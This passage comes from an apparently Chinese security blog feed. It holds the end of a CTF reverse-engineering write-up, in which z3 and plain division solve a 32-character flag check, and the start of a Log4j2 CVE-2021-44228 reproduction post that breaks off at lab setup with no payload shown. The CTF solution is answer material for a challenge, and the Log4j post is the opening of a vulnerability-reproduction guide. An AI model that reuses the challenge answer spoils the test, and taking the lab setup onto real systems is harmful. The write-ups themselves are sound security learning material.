punctuation">(</span> <span class="token number">3645600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">174988800</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">10115280</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">981182160</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">9667504</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">493042704</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5364450</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">257493600</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">13464540</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">767478780</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5488432</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">312840624</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">14479500</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1404511500</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6451830</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">316139670</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6252576</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">619005024</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7763364</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">372641472</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7327320</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">373693320</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8741520</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">498266640</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8871876</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">452465676</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4086720</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">208422720</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">9374400</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">515592000</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">5759124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">719890500</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>也就是说当 a [0] ~ a [31] 满足以下条件就会返回非 0 数字：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">166163712</span> <span class="token comment">// 1629056</span></pre></td></tr><tr><td data-num="2"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">731332800</span> <span class="token comment">// 6771600</span></pre></td></tr><tr><td data-num="3"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">357245568</span> <span class="token comment">// 3682944</span></pre></td></tr><tr><td data-num="4"></td><td><pre>…</pre></td></tr><tr><td data-num="5"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">719890500</span> <span class="token comment">// 5759124</span></pre></td></tr></table></figure><p>出题人漏了一个 a [6]=49 (也就是字符 “1”）</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407203417722.png" alt="image-20220407203417722" /></p>
<p>用 z3 爆破出每一个 a [i] 的值，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1ozUHJvdmVyL3ozL3JlbGVhc2VzL3RhZy96My00LjguMTU=">z3 库下载</span></p>
<p>这里我放到 kali 机中进行安装选择的是 linux 版本，如放 windows 中安装请自行选择。</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#下载</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">wget</span> https://github.com/Z3Prover/z3/releases/download/z3-4.8.15/z3_solver-4.8.15.0-py2.py3-none-manylinux1_x86_64.whl</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#安装：</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">sudo</span> pip <span class="token function">install</span> z3_solver-4.8.15.0-py2.py3-none-manylinux1_x86_64.whl</pre></td></tr></table></figure><p>exp1：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>a1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">32</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'a1['</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">']'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">1629056</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">166163712</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6771600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">731332800</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3682944</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">357245568</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">10431000</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1074393000</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3977328</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">489211344</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5138336</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">518971936</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7532250</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">406741500</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5551632</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">294236496</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3409728</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">177305856</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">13013670</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">650683500</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6088797</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">298351053</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7884663</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">386348487</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8944053</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">438258597</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5198490</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">249527520</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">4544518</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">445362764</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3645600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">174988800</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">10115280</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">981182160</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">9667504</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">493042704</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5364450</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">257493600</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">13464540</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">767478780</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5488432</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">312840624</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">14479500</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1404511500</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6451830</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">316139670</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6252576</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">619005024</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7763364</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">372641472</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7327320</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">373693320</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8741520</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">498266640</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8871876</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">452465676</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">4086720</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">208422720</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">9374400</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">515592000</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">5759124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">719890500</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>exp2：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">166163712</span> <span class="token operator">//</span> <span class="token number">1629056</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">731332800</span> <span class="token operator">//</span> <span class="token number">6771600</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">357245568</span> <span class="token operator">//</span> <span class="token number">3682944</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1074393000</span> <span class="token operator">//</span> <span class="token number">10431000</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">489211344</span> <span class="token operator">//</span> <span class="token number">3977328</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">518971936</span> <span class="token operator">//</span> <span class="token number">5138336</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">406741500</span> <span class="token operator">//</span> <span class="token number">7532250</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">294236496</span> <span class="token operator">//</span> <span class="token number">5551632</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">177305856</span> <span class="token operator">//</span> <span class="token number">3409728</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">650683500</span> <span class="token operator">//</span> <span class="token number">13013670</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">298351053</span> <span class="token operator">//</span> <span class="token number">6088797</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">386348487</span> <span class="token operator">//</span> <span class="token number">7884663</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">438258597</span> <span class="token operator">//</span> <span class="token number">8944053</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">249527520</span> <span class="token operator">//</span> <span class="token number">5198490</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">445362764</span> <span class="token operator">//</span> <span class="token number">4544518</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">981182160</span> <span class="token operator">//</span> <span class="token number">10115280</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">174988800</span> <span class="token operator">//</span> <span class="token number">3645600</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">493042704</span> <span class="token operator">//</span> <span class="token number">9667504</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">257493600</span> <span class="token operator">//</span> <span class="token number">5364450</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">767478780</span> <span class="token operator">//</span> <span class="token number">13464540</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">312840624</span> <span class="token operator">//</span> <span class="token number">5488432</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1404511500</span> <span class="token operator">//</span> <span class="token number">14479500</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">316139670</span> <span class="token operator">//</span> <span class="token number">6451830</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">619005024</span> <span class="token operator">//</span> <span class="token number">6252576</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">372641472</span> <span class="token operator">//</span> <span class="token number">7763364</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">373693320</span> <span class="token operator">//</span> <span class="token number">7327320</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">498266640</span> <span class="token operator">//</span> <span class="token number">8741520</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">452465676</span> <span class="token operator">//</span> <span class="token number">8871876</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">208422720</span> <span class="token operator">//</span> <span class="token number">4086720</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">515592000</span> <span class="token operator">//</span> <span class="token number">9374400</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">719890500</span> <span class="token operator">//</span> <span class="token number">5759124</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">for</span> x <span class="token keyword">in</span> a<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407214624619.png" alt="image-20220407214624619" /></p>
<h2 id="博文有待更新作者还需努力"><a class="anchor" href="#博文有待更新作者还需努力">#</a> 博文有待更新，作者还需努力！！！</h2>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Re</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-44228-Log4j2-RCE漏洞复现</title>
    <url>/article/a3856889.html</url>
    <content><![CDATA[<h2 id="0x00-漏洞介绍"><a class="anchor" href="#0x00-漏洞介绍">#</a> 0x00 漏洞介绍</h2>
<p>Apache Log4j2 是一个 Java 的日志组件，在特定的版本中由于其启用了 lookup 功能，从而导致产生远程代码执行漏洞。</p>
<p>影响版本：Apache Log4j2 2.0-beta9 - 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）</p>
<p>漏洞编号：CVE-2021-44228</p>
<h2 id="0x01-环境准备"><a class="anchor" href="#0x01-环境准备">#</a> 0x01 环境准备</h2>
<table>
<thead>
<tr>
<th style="text-align:left">测试环境</th>
<th style="text-align:left">IP</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Kali-linux-2020.3</td>
<td style="text-align:left">192.168.146.135</td>
</tr>
</tbody>
</table>
<h2 id="0x02-vulfocus靶场搭建"><a class="anchor" href="#0x02-vulfocus靶场搭建">#</a> 0x02 vulfocus 靶场搭建</h2>
<ol>
<li>拉取 docker</li>
</ol>
